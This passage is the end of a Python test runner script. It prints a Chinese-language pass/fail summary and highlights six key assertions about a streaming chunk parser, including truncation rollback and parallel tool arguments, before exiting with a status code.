    print(f"{GREEN}  ✓ {passed} 条断言全部通过{OFF}")
    print(
        DIM
        + "\n  这 68 条里最该记住的六条：\n"
        + "    A-19  穷举切割点——它一条就能抓住整个分帧实现的所有漏洞\n"
        + "    B-04  没有 step 边界时 reset 清空全部（「无边界」的边界情况）\n"
        + "    B-10  未知 chunk 类型不抛错（严格校验在这里是 bug 不是美德）\n"
        + "    C-06  max_tokens 截断要撤回，而这条路上没有任何错误信号\n"
        + "    D-01  交错的并行参数不串台（这个 bug 在单调用时完全不可见）\n"
        + "    E-01  组件卸载**不要**停止生成（和 React 的本能正面冲突）\n"
        + OFF
    )
    sys.exit(0)
else:
    print(f"{RED}  {len(failures)} 条失败，{passed} 条通过{OFF}")
    sys.exit(1)
